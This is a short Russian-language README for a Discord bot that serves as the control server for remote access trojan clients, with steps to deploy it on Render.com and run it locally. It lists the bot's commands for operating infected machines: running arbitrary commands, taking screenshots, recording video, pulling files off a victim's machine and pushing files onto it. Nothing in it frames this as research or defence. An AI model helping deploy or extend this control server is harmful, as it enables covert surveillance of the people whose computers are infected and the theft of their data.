# Discord RAT Server

Discord bot для управления RAT клиентами.

## Деплой на Render.com

1. Форкни этот репозиторий
2. На Render.com создай новый Web Service
3. Подключи свой GitHub репозиторий
4. Добавь Environment Variable:
   - Key: `DISCORD_BOT_TOKEN`
   - Value: твой токен Discord бота
5. Deploy!

## Локальный запуск

```bash
pip install -r requirements.txt
export DISCORD_BOT_TOKEN="твой_токен"
python main.py
```

## Команды бота

- `!clients` - список клиентов
- `!cmd <id> <command>` - выполнить команду
- `!screenshot <id>` - скриншот
- `!video <id> [duration]` - записать видео
- `!download <id> <path>` - скачать файл
- `!upload <id> <url> <path>` - загрузить файл
- `!sysinfo <id>` - информация о системе
